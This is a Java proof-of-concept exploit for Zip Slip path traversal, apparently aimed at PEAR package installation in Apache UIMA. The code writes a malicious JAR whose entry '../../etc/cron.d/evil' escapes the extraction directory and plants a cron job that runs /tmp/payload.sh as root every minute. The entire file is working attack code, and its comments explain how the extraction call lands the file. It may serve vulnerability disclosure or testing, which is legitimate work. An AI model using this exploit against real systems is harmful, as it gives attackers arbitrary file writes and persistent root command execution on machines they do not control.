import java.util.zip.*;
import java.io.*;

public class ZipSlipExploit {
    public static void main(String[] args) throws Exception {
        // Create JAR with Zip Slip entry
        FileOutputStream fos = new FileOutputStream("malicious.jar");
        ZipOutputStream zos = new ZipOutputStream(fos);
        // Traversal entry - escapes targetDir two levels up
        ZipEntry entry = new ZipEntry("../../etc/cron.d/evil");
        zos.putNextEntry(entry);
        zos.write("*/1 * * * * root /tmp/payload.sh\n".getBytes());
        zos.closeEntry();
        zos.close();
        // When this JAR is installed as a PEAR package:
        // FileUtil.extractFilesFromJar(jarFile, targetDir) 
        // will write to /etc/cron.d/evil (if targetDir is e.g. /opt/uima/pears/mycomp)
    }
}

